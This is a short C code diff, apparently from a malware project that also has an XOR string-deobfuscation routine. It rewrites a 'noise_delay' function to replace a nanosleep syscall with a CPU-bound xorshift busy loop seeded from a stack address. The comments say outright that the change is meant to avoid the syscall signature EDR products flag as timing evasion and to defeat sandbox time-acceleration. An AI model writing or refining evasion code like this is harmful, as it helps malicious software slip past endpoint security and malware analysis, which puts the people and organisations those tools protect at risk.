@@ -26,19 +26,25 @@ void deobf_str_xor(char* dst, const uint8_t* src, size_t len, uint8_t key) {
 void noise_delay(unsigned max_ms) {
     if (max_ms == 0) return;
 
-    static int seeded = 0;
-    if (!seeded) {
-        srand((unsigned)(time(NULL) ^ getpid()));
-        seeded = 1;
+    /* CPU-bound xorshift loop: avoids the nanosleep syscall signature
+     * that modern EDRs flag as a timing-evasion indicator, and cannot
+     * be fast-forwarded by sandbox time-acceleration.
+     * The stack frame address provides ASLR-derived seed entropy so the
+     * iteration count varies across runs even for the same max_ms value. */
+    uint32_t x = (uint32_t)(uintptr_t)&x ^ (uint32_t)max_ms;
+    if (x == 0) x = 0xA5A5;
+
+    /* ~750K iterations ≈ 1 ms on a 1.5 GHz in-order ARM64 core.
+     * Spread: [max_ms/4, 3*max_ms/4) — mirrors the previous nanosleep range. */
+    unsigned long spread = (unsigned long)((x & 0xFFFF) * (max_ms / 2 + 1)) >> 16;
+    unsigned long iters  = ((unsigned long)(max_ms / 4) + spread) * 750000UL;
+
+    for (unsigned long i = 0; i < iters; i++) {
+        x ^= x << 13;
+        x ^= x >> 17;
+        x ^= x << 5;
     }
-
-    unsigned ms = (unsigned)(rand() % (max_ms / 2 + 1)) + max_ms / 4;
-
-    struct nl_timespec req;
-    req.tv_sec  = (long)(ms / 1000);
-    req.tv_nsec = (long)((ms % 1000) * 1000000L);
-
-    syscall2(__NR_nanosleep, (long)&req, 0);
+    __asm__ __volatile__("" : "+r"(x) : : "memory");
 }
 
 /*
